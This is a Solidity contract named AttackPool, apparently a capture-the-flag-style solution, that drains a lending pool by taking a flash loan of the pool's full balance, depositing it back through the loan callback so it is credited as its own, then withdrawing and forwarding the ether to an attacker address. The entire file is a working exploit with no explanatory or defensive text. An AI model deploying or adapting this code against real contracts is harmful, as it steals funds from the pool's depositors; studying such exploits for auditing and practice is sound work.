// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackPool {
    IPool immutable victim;
    address immutable attacker;

    constructor(address _victim, address _attacker) {
        victim = IPool(_victim);
        attacker = _attacker;
    }

    function attack() external {
        victim.flashLoan(address(victim).balance);
        victim.withdraw();
        (bool success,) = attacker.call{value: address(this).balance}("");
    }

    function execute() external payable {
        require(tx.origin == attacker);
        require(msg.sender == address(victim));

        victim.deposit{value: msg.value}();
    }

    receive() external payable {}
}
